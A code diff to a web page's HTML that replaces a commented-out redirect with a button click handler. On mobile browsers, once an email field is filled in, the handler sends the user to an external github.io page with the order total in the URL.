@@ -2460,13 +2460,32 @@
         </div> -->
         <script src="require.min.js?saaf" data-main="require-frontend.min.js?v=1.3.15"></script>
 
-        <script>
-          function www() {
-// 				var Ead = document.getElementById('total').innerHTML
-				window.location.href = "https://svip66.github.io/k/b/index.html"
-// 				window.location.replace("https://svip66.github.io/k/b/index.html");
-			}
-            
-        </script>
+<script>
+			var Ead = document.getElementById('total').innerHTML
+			var btn = document.getElementById('sdsd')
+			btn.addEventListener(
+				'click',
+				function () {
+					if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+						var adcv = document.getElementById('adcv').value
+						if (adcv === '') {
+							alert('请填写收货邮箱')
+							return null
+							// console.log('1')
+						} else {
+							alert('跳转网站')
+							// console.log('2')
+							window.location.href = 'https://svip66.github.io/c/a?vip=' + Ead
+						}
+
+						// alert('hello wrold')
+					} else {
+						alert('请在手机游览器下单！')
+						// 	        location.href = qr_url;
+					}
+				},
+				false
+			)
+		</script>
     </body>
 </html>
